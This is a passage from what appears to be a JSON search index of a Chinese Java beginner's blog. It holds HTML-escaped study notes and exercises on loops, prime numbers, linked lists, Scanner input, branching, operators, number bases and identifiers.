= 1;i &lt;= 10;i++)&#123; if(i % 4 == 0)&#123; break;//123 //continue;//123567910 //System.out.println(&quot;今晚迪丽热巴要约我！！！&quot;); &#125; System.out.print(i); &#125; System.out.println(); for (int i = 1; i &lt;= 4; i++) &#123; for (int j = 1; j &lt;= 10; j++) &#123; if(j % 4 == 0)&#123; break; &#125; System.out.print(j); &#125; System.out.println(); &#125; label:for(int i = 1;i &lt;= 4;i++)&#123; for(int j = 1;j &lt;= 10;j++)&#123; if(j % 4 == 0)&#123; //break label;//结束指定标识的一层循环结构 continue label;//结束指定标识的一层循环结构当次循环 &#125; System.out.print(j); &#125; System.out.println(); &#125; &#125;&#125; 2. 求 100000 以内的所有质数的输出（逐渐优化）1. 方法 1123456789101112131415161718public class PrimeNumberTest &#123; public static void main(String[] args) &#123; boolean isFlag = true; for (int i = 2; i &lt;= 100; i++) &#123; //遍历100以内的自然数 for (int j = 2; j &lt; i; j++) &#123; //j:被i去除 if (i % j == 0)&#123; //i被j除尽 isFlag = false; break; &#125; &#125; if(isFlag == true)&#123; System.out.println(i); &#125; isFlag = true; //重置isFlag &#125; &#125;&#125; 2.方法 21234567891011121314151617181920212223242526public class PrimeNumberTest1 &#123; public static void main(String[] args) &#123; boolean isFlag = true; int count = 0;//记录质数的个数 long start = System.currentTimeMillis();//时间戳 for (int i = 2; i &lt;= 100000; i++) &#123; //遍历100以内的自然数 for (int j = 2; j &lt; Math.sqrt(i); j++) &#123; //j:被i去除 if (i % j == 0)&#123; //i被j除尽 isFlag = false; break; &#125; &#125; if(isFlag == true)&#123; //System.out.println(i); count++; &#125; isFlag = true; //重置isFlag &#125; long end = System.currentTimeMillis();//时间戳 System.out.println(&quot;质数的个数为：&quot; + count); System.out.println(&quot;所花费的时间为：&quot; + (end - start));//17110 - 优化一：break:1546 - 优化二：13 &#125;&#125; 3. 方法 31234567891011121314151617181920public class PrimeNumberTest2 &#123; public static void main(String[] args) &#123; int count = 0;//记录质数的个数 long start = System.currentTimeMillis();//时间戳 label:for (int i = 2; i &lt;= 100000; i++) &#123; //遍历100以内的自然数 for (int j = 2; j &lt; Math.sqrt(i); j++) &#123; //j:被i去除 if (i % j == 0)&#123; //i被j除尽 continue label; &#125; &#125; //能执行到此步骤的，都是质数 count++; &#125; long end = System.currentTimeMillis();//时间戳 System.out.println(&quot;质数的个数为：&quot; + count); System.out.println(&quot;所花费的时间为：&quot; + (end - start));//17110 - 优化一：break:1546 - 优化二：13 &#125;&#125;","tags":["Java","学习笔记","基础","嵌套循环"],"categories":["Java学习笔记"]},{"title":"java练习2","path":"//coding/java/exercise/2.html","content":"看不懂的链表123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150public class NodeTest &#123; public static void main(String[] args) &#123; Node node1 = new Node(1, &quot;李白1&quot;, &quot;刺客1&quot;); Node node2 = new Node(2, &quot;李白2&quot;, &quot;刺客2&quot;); Node node3 = new Node(3, &quot;李白3&quot;, &quot;刺客3&quot;); Node node4 = new Node(4, &quot;李白4&quot;, &quot;刺客4&quot;); Node node5 = new Node(5, &quot;李白5&quot;, &quot;刺客5&quot;); Node node6 = new Node(5, &quot;李白&quot;, &quot;刺客5&quot;); SingleLinkedList singleLinkedList = new SingleLinkedList(); singleLinkedList.add(node1); singleLinkedList.add(node2); singleLinkedList.add(node4); singleLinkedList.add(node5); singleLinkedList.add2(node3); singleLinkedList.delete(3); singleLinkedList.delete(6); singleLinkedList.change(node6); singleLinkedList.change(1, &quot;李白6&quot;, &quot;刺客6&quot;); singleLinkedList.show(); &#125;&#125;class SingleLinkedList&#123; private Node head=new Node(0, &quot;&quot;, &quot;&quot;); public void add(Node node)&#123; Node temp = head; while (true)&#123; if (temp.next == null)&#123; break; &#125; temp = temp.next; &#125; temp.next = node; &#125; public void add2(Node node)&#123; Node temp = head; boolean flag = false; while (true)&#123; if (temp.next == null)&#123; break; &#125; if (temp.next.no &gt; node.no)&#123; break; &#125;else if (temp.next.no == node.no)&#123; flag = true; break; &#125; temp = temp.next; &#125; if (flag)&#123; System.out.println(&quot;编号已经存在，不能添加&quot;); &#125;else &#123; node.next = temp.next; temp.next = node; &#125; &#125; public void delete(int no)&#123; Node temp = head; boolean flag = false; while (true)&#123; if (temp.next == null)&#123; break; &#125; if (temp.next.no == no)&#123; flag = true; break; &#125; temp = temp.next; &#125; if (flag)&#123; temp.next = temp.next.next; &#125;else &#123; System.out.println(&quot;不存在&quot;); &#125; &#125; public void change(int no, String name, String type)&#123; if(head.next == null)&#123; System.out.println(&quot;链表为空&quot;); return; &#125; Node temp = head.next; boolean flag = false; while (true)&#123; if(temp == null)&#123; System.out.println(&quot;没有找到数据&quot;); break; &#125; if (temp.no == no)&#123; flag = true; break; &#125; &#125; if (flag)&#123; temp.name = name; temp.type = type; &#125; &#125; public void change(Node node)&#123; Node temp = head; //boolean flag = false; delete(node.no); add2(node); &#125; public void show()&#123; if (head.next == null)&#123; System.out.println(&quot;该链表为空&quot;); return; &#125; Node temp = head.next; while (true)&#123; if (temp == null)&#123; break; &#125; System.out.println(temp); temp = temp.next; &#125; &#125;&#125;class Node&#123; public int no; public String name; public String type; public Node next; public Node(int no, String name, String type)&#123; this.no = no; this.name = name; this.type = type; &#125; @Override public String toString() &#123; return &quot;Node&#123;&quot; + &quot;no=&quot; + no + &quot;, name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &quot;, type=&#x27;&quot; + type + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125;","tags":["Java","练习","进阶","链表","node"],"categories":["Java练习"]},{"title":"java学习笔记5","path":"//coding/java/note/5.html","content":"程序流程控制 顺序结构 分支结构 循环结构 输入 Scanner 具体步骤 导包：import java.util.Scanner; Scanner 的实例化:Scanner scan &#x3D; new Scanner(System.in); 调用 Scanner 类的相关方法（next() &#x2F; nextXxx()），来获取指定类型的变量 java 代码 1234567891011121314151617181920212223242526272829303132//1.导包：import java.util.Scanner;import java.util.Scanner;public class ScannerTest &#123; public static void main(String[] args) &#123; //2.Scanner的实例化 Scanner scan = new Scanner(System.in); //3.调用Scanner类的相关方法 System.out.println(&quot;请输入姓名：&quot;); String name = scan.next(); System.out.println(name); System.out.println(&quot;请输入你的芳龄：&quot;); int age = scan.nextInt(); System.out.println(age); System.out.println(&quot;请输入&quot;); double weight = scan.nextDouble(); System.out.println(weight); System.out.println(&quot;你是否相中我了呢？(true/false)&quot;); boolean isLove = scan.nextBoolean(); System.out.println(isLove); //对于char型的获取，Scanner没有提供相关的方法。只能获取一个字符串 System.out.println(&quot;请输入你的性别：(男/女)&quot;); String gender = scan.next(); char genderChar = gender.charAt(0);//获取索引为0位置上的字符 System.out.println(genderChar); &#125;&#125; 3. Tip:需要根据相应的方法，来输入指定类型的值。如果输入的数据类型与要求的类型不匹配时，会报异常：InputMisMatchException，导致程序终止。 1. 分支结构(if——else)1. 三种结构第一种： 123if(条件表达式)&#123; 执行表达式&#125; 第二种：二选一 12345if(条件表达式)&#123; 执行表达式1&#125;else&#123; 执行表达式2&#125; 第三种：n 选一 1234567891011if(条件表达式)&#123; 执行表达式1&#125;else if(条件表达式)&#123; 执行表达式2&#125;else if(条件表达式)&#123; 执行表达式3&#125;...else&#123; 执行表达式n&#125; 2. java 代码123456789101112131415161718192021222324252627282930public class IfTest &#123; public static void main(String[] args) &#123; int heartBeats = 67; if(heartBeats &lt; 60 || heartBeats &gt; 100)&#123; System.out.println(&quot;需要进一步检查&quot;); &#125; System.out.println(&quot;检查结束&quot;); int age = 23; if(age &lt; 18)&#123; System.out.println(&quot;可以看动画片了&quot;); &#125;else &#123; System.out.println(&quot;可以看大动画片了&quot;); &#125; if(age &lt; 0)&#123; System.out.println(&quot;输入的数据非法&quot;); &#125;else if(age &lt; 18)&#123; System.out.println(&quot;青少年模式&quot;); &#125;else if(age &lt; 35)&#123; System.out.println(&quot;青壮年模式&quot;); &#125;else if(age &lt; 60)&#123; System.out.println(&quot;中年模式&quot;); &#125;else if(age &lt; 120)&#123; System.out.println(&quot;老年模式&quot;); &#125;else if(age &gt; 120)&#123; System.out.println(&quot;成仙模式&quot;); &#125; &#125;&#125; 3. Tip else 结构是可选的。 针对于条件表达式： 如果条件表达式之间没有交集的关系,判断和执行语句声明与在上面还是下面无关。 如果条件表达式之间有交集的关系，需要根据实际情况，考虑清楚应该将哪个结构声明在上面。 如果条件表达式之间有包含的关系，需要将范围小的声明在范围大的上面。否则，范围小的就不会执行了。 if-else 结构是可以相互嵌套的。 if-else 结构中的执行语句只有一行时，对应的{}可以省略的。但是，不建议大家省略。 2. 分支结构(switch-case)1. 结构12345678910111213141516switch(表达式)&#123;case 常量1: 执行语句1; //break;case 常量2: 执行语句2; //break;...default: 执行语句n; //break;&#125; 2. java 代码12345678910111213141516171819202122public class SwitchCaseTest &#123; public static void main(String[] args) &#123; String season = &quot;summer&quot;; switch (season)&#123; case &quot;spring&quot;: System.out.println(&quot;春暖花开&quot;); break; case &quot;summer&quot;: System.out.println(&quot;夏日炎炎&quot;); break; case &quot;autumn&quot;: System.out.println(&quot;秋高气爽&quot;); break; case &quot;winter&quot;: System.out.println(&quot;冬雪皑皑&quot;); break; default: System.out.println(&quot;季节输入有误&quot;); break; &#125; &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748//从键盘分别输入年、月、日，判断这一天是当年的第几天import java.util.Scanner;public class SwitchCaseExer &#123; public static void main(String[] args) &#123; Scanner scan = new Scanner(System.in); System.out.println(&quot;请输入year：&quot;); int year = scan.nextInt(); System.out.println(&quot;请输入month：&quot;); int month = scan.nextInt(); System.out.println(&quot;请输入day：&quot;); int day = scan.nextInt(); //定义一个变量来保存总天数 int sumDays = 0; switch(month)&#123; case 12: sumDays += 30; case 11: sumDays += 31; case 10: sumDays += 30; case 9: sumDays += 31; case 8: sumDays += 31; case 7: sumDays += 30; case 6: sumDays += 31; case 5: sumDays += 30; case 4: sumDays += 31; case 3: if((year % 4 == 0 &amp;&amp; year % 100 != 0) || year % 400 == 0)&#123; sumDays += 29; &#125;else &#123; sumDays += 28; &#125; case 2: sumDays += 31; case 1: sumDays += day; &#125; System.out.println(year + month + &quot;月&quot; + day + &quot;日是当年的第&quot; + sumDays + &quot;天&quot;); &#125;&#125; 3. Tip 根据 switch 中的值，依次匹配各个 case 中的常量。匹配成功后，则进入相应 case 中。当调用完执行语句以后，则仍然继续向下执行其他 case 结构中的执行语句，直到遇到 break 关键字或此 switch-case 结构末尾结束为止。 break 在 switch-case 结构中，表示遇到此关键字后，就跳出 switch-case 结构 switch 结构中的表达式，只能是如下的 6 种数据类型之一：byte 、short、char、int、枚举类型(JDK5.0 新增)、String 类型(JDK7.0 新增) case 后面只能放常量，不能放范围。（case age &gt; 18:） break 关键字是可选的。 default:相当于 if-else 结构中的 else。default 结构是可选的，而且位置是灵活的。 凡是可以使用 switch-case 的结构，都可以用 if-else。反之，不成立。 我们写分支结构时，当发现既可以使用 switch-case,（而且，switch 中表达式的取值情况不太多），又可以使用 if-else 时，我们优先用 switch-case。原因：switch-case 执行效率稍高。 3. 循环结构（for 循环）1. 结构12345678910① 初始化条件② 循环条件 ---&gt;是boolean类型③ 循环体④ 迭代条件for(①;②;④)&#123; ③&#125;执行过程：① - ② - ③ - ④ - ② - ③ - ④ - ... - ② 2.java 代码12345678910111213141516171819202122232425262728public class ForTest &#123; public static void main(String[] args) &#123; for (int i = 0; i &lt; 5; i++)&#123; System.out.println(i + &quot; hello world&quot;); &#125; int num = 1; //abcbcbc for(System.out.print(&#x27;a&#x27;); num &lt;= 3; System.out.print(&#x27;c&#x27;), num++)&#123; System.out.print(&#x27;b&#x27;); &#125; System.out.println(); //遍历100以内的偶数,输出所有偶数的和,输出偶数的个数 int sum = 0; int count = 0; for (int i = 1; i &lt;= 100; i++) &#123; if(i % 2 == 0)&#123; //System.out.println(i); sum += i; count++; &#125; &#125; System.out.println(&quot;总和为：&quot; + sum); System.out.println(&quot;个数为：&quot; + count); &#125;&#125; 4. 循环结构（while 循环）1. 结构1234567891011① 初始化条件② 循环条件 ---&gt;是boolean类型③ 循环体④ 迭代条件①while(②)&#123; ③; ④;&#125;执行过程：① - ② - ③ - ④ - ② - ③ - ④ - ... - ② 2. java 代码1234567891011121314public class WhileTest &#123; public static void main(String[] args) &#123; int i = 2; while (i &lt;= 100)&#123; if(i % 2 == 0)&#123; System.out.println(i); &#125; i++; &#125; //循环外，仍然有i System.out.println(i);//101 &#125;&#125; 3.Tip 写 while 循环记得要写迭代条件。一旦丢了，就可能导致死循环，我们要避免出现死循环。 for 循环和 while 循环是可以相互转换的！区别：for 循环和 while 循环的初始化条件部分的作用范围不同。 5. 循环结构（do while 循环）1. 结构12345678910111213① 初始化条件② 循环条件 ---&gt;是boolean类型③ 循环体④ 迭代条件①do&#123; ③; ④;&#125;while(②);执行过程：① - ③ - ④ - ② - ③ - ④ - ... - ② 2. java 代码12345678910111213141516171819202122232425262728293031public class DoWhileTest &#123; public static void main(String[] args) &#123; //遍历100以内的偶数,并计算所有偶数的和及偶数的个数 int num = 1; int sum = 0; int count = 0; do &#123; if(num % 2 == 0)&#123; System.out.println(num); sum += num; count++; &#125; num++; &#125;while (num &lt;= 100); System.out.println(&quot;总和为：&quot; + sum); System.out.println(&quot;个数为：&quot; + count); //do-while至少执行一次循环体 int number1 = 10; while (number1 &gt;10)&#123; System.out.println(&quot;while&quot;); number1--; &#125; int number2 = 10; do &#123; System.out.println(&quot;do_while&quot;); number2--; &#125;while (number2 &gt; 10); &#125;&#125; 3. Tip do-while 循环至少会执行一次循环体！ 开发中，使用 for 和 while 更多一些。较少使用 do-while 6. 最简单“无限” 循环格式while(true) , for(;;),无限循环存在的原因是并不知道循环多少次，需要根据循环体内部某些条件，来控制循环的结束。 123456789101112131415161718192021222324252627//从键盘读入个数不确定的整数，并判断读入的正数和负数的个数，输入为0时结束程序。import java.util.Scanner;public class ForWhileTest &#123; public static void main(String[] args) &#123; Scanner scanner = new Scanner(System.in); int positiveNumber = 0; //正数的个数 int negativeNumber = 0; //负数的个数 while (true)&#123; //for (;;) int number = scanner.nextInt(); if(number &gt; 0)&#123; positiveNumber++; &#125;else if(number &lt; 0)&#123; negativeNumber++; &#125;else &#123; break; &#125; &#125; System.out.println(&quot;正数: &quot; + positiveNumber); System.out.println(&quot;负数：&quot; + negativeNumber); &#125;&#125; 结束方法 循环条件部分返回 false 在循环体中，执行 break","tags":["Java","学习笔记","基础","循环","Scanner","选择"],"categories":["Java学习笔记"]},{"title":"java学习笔记4","path":"//coding/java/note/4.html","content":"一. 运算符 算术运算符赋值运算符比较运算符（关系运算符）逻辑运算符位运算符三元运算符 1. 算术运算符1. 常用的算术运算符 运算符 运算 范例 结果 + 正号 +3 3 - 负号 b&#x3D;4; -b -4 + 加 5+5 10 - 减 6-4 2 * 乘 3*4 12 &#x2F; 除 5&#x2F;5 1 % 取模(取余) 7%5 2 ++ 自增（前）：先运算后取值 a&#x3D;2;b&#x3D;++a; a&#x3D;3;b&#x3D;3 ++ 自增（后）：先取值后运算 a&#x3D;2;b&#x3D;a++; a&#x3D;3;b&#x3D;2 - - 自减（前）：先运算后取值 a&#x3D;2;b&#x3D;- -a a&#x3D;1;b&#x3D;1 - - 自减（后）：先取值后运算 a&#x3D;2;b&#x3D;a- - a&#x3D;1;b&#x3D;2 + 字符串连接 “He”+”llo” “Hello 2. 除法运算 &#x2F;java 代码1234567891011121314151617181920public class AriTest &#123; public static void main(String[] args) &#123; int num1 = 12; int num2 = 5; int result1 = num1 / num2; System.out.println(result1); //2 int result2 = num1 / num2 * num2; System.out.println(result2); //10 double result3 = num1 / num2; System.out.println(result3); //2.0 double result4 = num1 / (num2 + 0.0); //2.4 System.out.println(result4); double result5 = (double) num1 / num2; //2.4 System.out.println(result5); &#125;&#125; 2. 取余运算 %1. java 代码123456789public class AriTest &#123; public static void main(String[] args) &#123; //取余运算 % System.out.println(&quot;12 % 5 = &quot; + 12 % 5); //2 System.out.println(&quot;-12 % 5 = &quot; + -12 % 5); //-2 System.out.println(&quot;12 % -5 = &quot; + 12 % -5); //2 System.out.println(&quot;-12 % -5 = &quot; + -12 % -5); //-2 &#125;&#125; 2. Tip 结果的符号与被模数(前面那个)的符号相同。 经常使用%来判断能否被除尽的情况。 3. 前后自增（减） ++ –1.运算规则 (前)++ :先自增 1，后运算(后)++ :先运算，后自增 1(前)– :先自减 1，后运算(后)– :先运算，后自减 1自增 1 不会改变本身的数据类型 2. java 代码123456789101112131415161718192021222324252627public class AriTest &#123; public static void main(String[] args) &#123; //a++ ++a int a1 = 10; int b1 = ++a1; System.out.println(&quot;a1 = &quot; + a1 + &quot;,b1 = &quot; + b1);//11 11 int a2 = 10; int b2 = a1++; System.out.println(&quot;a2 = &quot; + a2 + &quot;,b2 = &quot; + b2);//10 11 int a3 = 10; //这样子两个都是一样的 ++a3;//a3++; short s1 = 10; s1 = (short) (s1 + 1); //这个是可以的 System.out.println(s1); //11 s1++; //自增1不会改变本身的数据类型 System.out.println(s1); //12 //--a a-- int a4 = 10; int b4 = --a4; System.out.println(&quot;a4 = &quot; + a4 + &quot;,b4 = &quot; + b4); //9 9 &#125;&#125; 2. 赋值运算符1. java 代码12345678910111213141516171819202122232425public class SetValueTest &#123; public static void main(String[] args) &#123; int i1 = 10; int j1 = 10; int i2 = 10, j2 = 20; //int i3 = j3 = 10; 这个不行 int i3, j3; //连续赋值 i3 = j3 = 10; int num1 = 10; num1 += 2; System.out.println(num1); //12 short s1 = 10; //s1 = s1 + 2;//编译失败 s1 += 2;//结论：不会改变变量本身的数据类型 System.out.println(s1); //12 int n1 = 10; n1 += (n1++) + (++n1);//n1 = n1 + (n1++) + (++n1); System.out.println(n1);//32 &#125;&#125; 2. Tip 支持连续赋值。扩展赋值运算符： +&#x3D;, -&#x3D;, *&#x3D;, &#x2F;&#x3D;, %&#x3D;不会改变变量本身的数据类型 3. 比较运算符1. 常用的比较运算符 运算符 运算 范例 结果 &#x3D;&#x3D; 相等于 4&#x3D;&#x3D;3 false !&#x3D; 不等于 4!&#x3D;3 true &lt; 小于 4&lt;3 false &gt; 大于 4&gt;3 true &lt;&#x3D; 小于等于 4&lt;&#x3D;3 false &gt;&#x3D; 大于等于 4&gt;&#x3D;3 true instanceof 检查是否是类的对象 “Hello” instanceof String true 2. java 代码1234567891011121314public class CompareTest &#123; public static void main(String[] args) &#123; int i = 10; int j = 20; System.out.println(i == j); //false System.out.println(i = j); //20 boolean b1 = true; boolean b2 = false; System.out.println(b2 == b1); //false System.out.println(b2 = b1); //true &#125;&#125; 3. Tip 比较运算符的结果是 boolean 类型区分 &#x3D;&#x3D; 和 &#x3D; 4.逻辑运算符1. 常用的逻辑运算符 &amp; —逻辑与| —逻辑或! —逻辑非&amp;&amp; —短路与|| —短路或^ —逻辑异或 2.运算规则 a b a&amp;b a&amp;&amp;b a&#124;b a&#124;&#124;b !a a^b true true true true true true false false true false false false true true false true false true false false true true true true false false false false false false true false 3.结论 与：一假则假 或：有真则真 非：取反 异或：一样则假，不一样则真 4. java 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public class LogicTest &#123; public static void main(String[] args) &#123; //相同点：&amp; 与 &amp;&amp; 的运算结果相同 //当符号左边是true时，二者都会执行符号右边的运算 //当符号左边是false时，&amp;继续执行符号右边的运算。&amp;&amp;不再执行符号右边的运算。 //开发中，推荐使用&amp;&amp; boolean b1 = true; b1 = false; int num1 = 10; if(b1 &amp; (num1++ &gt; 0))&#123; System.out.println(&quot;我现在在北京&quot;); &#125;else&#123; System.out.println(&quot;我现在在南京&quot;); //这个 &#125; System.out.println(&quot;num1 = &quot; + num1); //11 boolean b2 = true; b2 = false; int num2 = 10; if(b2 &amp;&amp; (num2++ &gt; 0))&#123; System.out.println(&quot;我现在在北京&quot;); &#125;else&#123; System.out.println(&quot;我现在在南京&quot;); //这个 &#125; System.out.println(&quot;num2 = &quot; + num2); //10 //相同点：| 与 || 的运算结果相同 //当符号左边是false时，二者都会执行符号右边的运算 //当符号左边是true时，|继续执行符号右边的运算，而||不再执行符号右边的运算 //开发中，推荐使用|| boolean b3 = false; b3 = true; int num3 = 10; if(b3 | (num3++ &gt; 0))&#123; System.out.println(&quot;我现在在北京&quot;); //这个 &#125;else&#123; System.out.println(&quot;我现在在南京&quot;); &#125; System.out.println(&quot;num3 = &quot; + num3); //11 boolean b4 = false; b4 = true; int num4 = 10; if(b4 || (num4++ &gt; 0))&#123; System.out.println(&quot;我现在在北京&quot;); //这个 &#125;else&#123; System.out.println(&quot;我现在在南京&quot;); &#125; System.out.println(&quot;num4 = &quot; + num4); //10 &#125;&#125; 5. Tip逻辑运算符操作的都是 boolean 类型的变量 5. 位运算符(直接对整数的二进制进行的运算)1. 常见的位运算符 运算符 运算 范例 &lt;&lt; 左移 3 &lt;&lt; 2 &#x3D; 12 –&gt; 322&#x3D;12 &gt;&gt; 右移 3 &gt;&gt; 1 &#x3D; 1 –&gt; 3&#x2F;2&#x3D;1 &gt;&gt;&gt; 无符号右移 3 &gt;&gt;&gt; 1 &#x3D; 1 –&gt; 3&#x2F;2&#x3D;1 &amp; 与运算 6 &amp; 3 &#x3D; 2 &#124; 或运算 6 &#124; 3 &#x3D; 7 ^ 异或运算 6 ^ 3 &#x3D; 5 ~ 取反运算 ~6 &#x3D; -7 2. 位运算符的细节 位运算符 细节 &lt;&lt; 空位补 0，被移除的高位丢弃，空缺位补 0。 &gt;&gt; 被移位的二进制最高位是 0，右移后，空缺位补 0；最高位是 1，空缺位补 1。 &gt;&gt;&gt; 被移位二进制最高位无论是 0 或者是 1，空缺位都用 0 补。 &amp; 二进制位进行&amp;运算，只有 1&amp;1 时结果是 1，否则是 0; &#124; 二进制位进行 &#124; 运算，只有 0 &#124; 0 时结果是 0，否则是 1; ^ 相同二进制位进行 ^ 运算，结果是 0；1^1&#x3D;0 , 0^0&#x3D;0 。 不相同二进制位 ^ 运算结果是 1。1^0&#x3D;1 , 0^1&#x3D;1 ~ 正数取反，各二进制码按补码各位取反。负数取反，各二进制码按补码各位取反 3. java 代码1234567891011121314151617public class BitTest &#123; public static void main(String[] args) &#123; int i = 21; //i = -21; System.out.println(&quot;i &lt;&lt; 2 :&quot; + (i &lt;&lt; 2)); System.out.println(&quot;i &lt;&lt; 3 :&quot; + (i &lt;&lt; 3)); System.out.println(&quot;i &lt;&lt; 27 :&quot; + (i &lt;&lt; 27)); int m = 12; int n = 5; //写成二进制，1表示true，表示false System.out.println(&quot;m &amp; n :&quot; + (m &amp; n)); //4 System.out.println(&quot;m | n :&quot; + (m | n)); //13 System.out.println(&quot;m ^ n :&quot; + (m ^ n)); //9 System.out.println(&quot;~m:&quot; + (~m)); //-13 符号位也取反 &#125;&#125; 4. Tip 位运算符操作的都是整型的数据 &lt;&lt; ：在一定范围内，每向左移 1 位，相当于 * 2 &gt;&gt; :在一定范围内，每向右移 1 位，相当于 &#x2F; 2 6. 三元运算符1. 结构：(条件表达式)? 表达式 1 : 表达式 22.java 代码1234567891011121314151617181920212223242526public class SanYuanTest &#123; public static void main(String[] args) &#123; //取最大值 int m = 12; int n = 5; int max = (m &gt; n) ? m : n; //12 System.out.println(max); double num = (m &gt; n)? 2 : 1.0; //(m &gt; n)? 2 : &quot;n大&quot;;//编译错误 n = 12; String maxStr = (m &gt; n)? &quot;m大&quot; : ((m == n)? &quot;m和n相等&quot; : &quot;n大&quot;); System.out.println(maxStr); //获取三个的最大值 int n1 = 12; int n2 = 30; int n3 = -43; int max1 = (n1 &gt; n2)? n1 : n2; int max2 = (max1 &gt; n3)? max1 : n3; System.out.println(&quot;三个数中的最大值为：&quot; + max2); &#125;&#125; 3. Tip 条件表达式的结果为 boolean 类型. 根据条件表达式真或假，true 则表达式 1，false 则表达式 2. 表达式 1 和表达式 2 数据类型. 要求是一致的。 三元运算符可以嵌套使用. 可以使用三元运算符的地方，都可以改写为 if-else，不能反过来. 如果既可以三元运算符，又可以 if-else 结构，那么优先三元运算符。原因：简洁、执行效率高。 2. 运算符优先级（从上到下由高到低） .() {} ; , R—&gt;L ++ – ~ !(data type) L—&gt;R * &#x2F; % L—&gt;R + - L—&gt;R &lt;&lt; &gt;&gt; &gt;&gt;&gt; L—&gt;R &lt; &gt; &lt;&#x3D; &gt;&#x3D; instanceof L—&gt;R &#x3D;&#x3D; !&#x3D; L—&gt;R &amp; L—&gt;R ^ L—&gt;R &#124; L—&gt;R &amp;&amp; L—&gt;R &#124;&#124; R—&gt;L ? : R—&gt;L &#x3D; *&#x3D; &#x2F;&#x3D; %&#x3D; +&#x3D; -&#x3D; &lt;&lt;&#x3D; &gt;&gt;&#x3D; &gt;&gt;&gt;&#x3D; &amp;&#x3D; ^&#x3D; &#124;&#x3D; 优先用括号 只有单目运算符、三元运算符、赋值运算符是从右向左运算的。","tags":["Java","学习笔记","基础","运算符"],"categories":["Java学习笔记"]},{"title":"java学习笔记3","path":"//coding/java/note/3.html","content":"一. 字符串 String（字符串）属于引用数据类型 声明 String 是，需要一对双引号”” String 可以和 8 种基本数据类型做运算，而且只能是连接运算 + ，结果为 String 1234567891011121314151617181920212223242526public class StringTest &#123; public static void main(String[] args) &#123; char c = &#x27;a&#x27;; int num = 10; String str = &quot;hello&quot;; //加法是从左加到右，String + int 得 String System.out.println(c + num + str); //107hello System.out.println(c + (num + str)); //a10hello System.out.println(c + str + num); //ahello10 System.out.println(str + num + c); //hello10a //注意 + 可以数字加，也可以连接 //做运算用单引号，做字符串拼接用双引号 System.out.println(&quot;* *&quot;); //* * System.out.println(&#x27;*&#x27; + &#x27;\\t&#x27; + &#x27;*&#x27;); //97 System.out.println(&#x27;*&#x27; + &quot;\\t&quot; + &#x27;*&#x27;); //* * System.out.println(&quot;*&quot; + &quot;\\t&quot; + &quot;*&quot;); //* * System.out.println(3.5f + &quot;&quot;); //3.5 字符串 String str1 = 123 + &quot;&quot;; //int num1 = (int)str1; //str 不能转换成 int int num1 = Integer.parseInt(str1); System.out.println(num1); //123 &#125;&#125; 二. 进制1. 常用的进制 二进制(binary)：0,1 ，满 2 进 1.以 0b 或 0B 开头。十进制(decimal)：0-9 ，满 10 进 1。八进制(octal)：0-7 ，满 8 进 1. 以数字 0 开头表示。十六进制(hex)：0-9 及 A-F，满 16 进 1. 以 0x 或 0X 开头表示。此处的 A-F 不区分大小写。 2. java 代码12345678910111213public class BinaryTest &#123; public static void main(String[] args) &#123; int num1 = 0b110; int num2 = 110; int num3 = 0127; int num4 = 0x110A; System.out.println(&quot;num1= &quot; + num1); //6 System.out.println(&quot;num2= &quot; + num2); //110 System.out.println(&quot;num3= &quot; + num3); //87 System.out.println(&quot;num4= &quot; + num4); //4362 &#125;&#125; 3. 二进制转换成十进制(原码，反码，补码)123456789101112131414为0 0 0 0 1 1 1 01 * 2^3 + 1 * 2^2 + 1* 2^1 = 14正数三码合一-14为，首位取 1 表示负数1 0 0 0 1 1 1 0 -14的原码除符号位外，各个位取反1 1 1 1 0 0 0 1 -14的反码反码+11 1 1 1 0 0 1 0 -14的补码计算机底层都以补码的方式来存储数据！ 2. 十进制转换成二进制（除 2 取余的逆）123456713 -&gt; 16 -&gt; 03 -&gt; 11 -&gt; 10 -&gt; 0从下往上读：1101","tags":["Java","学习笔记","基础","String","进制"],"categories":["Java学习笔记"]},{"title":"java学习笔记2","path":"//coding/java/note/2.html","content":"一. 标识符1. 标识符的使用例如：类名，变量名，方法名，接口名，包名2. 标识符的命名规则（不遵守直接报错） 由 26 个英文字母大小写，0-9 ，_或 $ 组成。 数字不可以开头。 不可以使用关键字和保留字，但能包含关键字和保留字。 Java 中严格区分大小写，长度无限制。 标识符不能包含空格。 3. 命名规范（遵守不会报错） 包名：多单词组成时所有字母都小写：xxxyyyzzz 类名、接口名：多单词组成时，所有单词的首字母大写：XxxYyyZzz 变量名、方法名：多单词组成时，第一个单词首字母小写，第二个单词开始每个单词首字母大写：xxxYyyZzz 常量名：所有字母都大写。多单词时每个单词用下划线连接：XXX_YYY_ZZZ 4. 关键字和保留字1. 注意保留字都是小写2. 关键字查看网站：https://docs.oracle.com/javase/tutorial/java/nutsandbolts/_keywords.html3. 保留字：goto 、const5.Tip 为了提高阅读性，起名字要“见名知意”。 java 采用 unicode 字符集，也可以使用汉字声明，但是不建议使用。 二. 变量1. 定义变量的格式数据类型 变量名 &#x3D; 变量值;int var &#x3D; 10;2. 变量的分类按数据类型 基本数据类型 数值型 整数类型 (byte \\ short \\ int \\ long) 浮点类型 (float \\ double) 字符型 (char) 布尔型 (boolean) 引用数据类型 类 (class) (字符串在这里) 接口 (interface) 数组 (array) 按声明的位置(后面细讲) 成员变量 局部变量 3. 整数1. 整数类型 类 型 占用存储空间 表数范围 byte 1 字节&#x3D;8bit 位 -128 ~ 127 short 2 字节 -215 ~215-1 int 4 字节 -231 ~ 231-1 (约 21 亿) long 8 字节 -263 ~ 263-1 2. 声明 long 型后面加‘l’或‘L’，不加则默认为 int 型。(long l1 &#x3D; 1234567890L)4.浮点1. 浮点类型 类 型 占用存储空间 表数范围 单精度 float 4 字节 -3.403E38 ~ 3.403E38 双精度 double 8 字节 -1.798E308 ~ 1.798E308 2. 声明 float 型后面加‘f’或‘F’，不加则默认为 double 型。(float f1 &#x3D; 12.3F)3. float 表示的数值范围比 long 大5. 字符1. 字符类型 类 型 占用存储空间 char 2 字节 2. 定义使用单引号 ‘’ (char c1 &#x3D; ‘a’)3. 三种表现形式 一个字符（数字也算字符） 转义字符（ \\t） 直接用 Unicode 值来表示字符型常量 (\\u0043) 5. 